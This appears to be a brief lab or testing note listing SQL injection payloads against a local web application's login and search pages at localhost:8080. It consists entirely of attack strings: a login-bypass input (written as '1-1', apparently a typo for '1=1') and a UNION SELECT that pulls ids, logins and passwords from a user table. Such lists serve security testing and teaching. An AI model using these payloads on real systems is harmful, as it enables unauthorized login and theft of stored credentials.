# SQL INJECTION QUERIES


### For login:
link: http://localhost:8080/login

vasya' or 1-1;--


### For search:
link: http://localhost:8080/search

vasya' or 1=1;--

vasya' or 1=1 union select id, login, password from user;--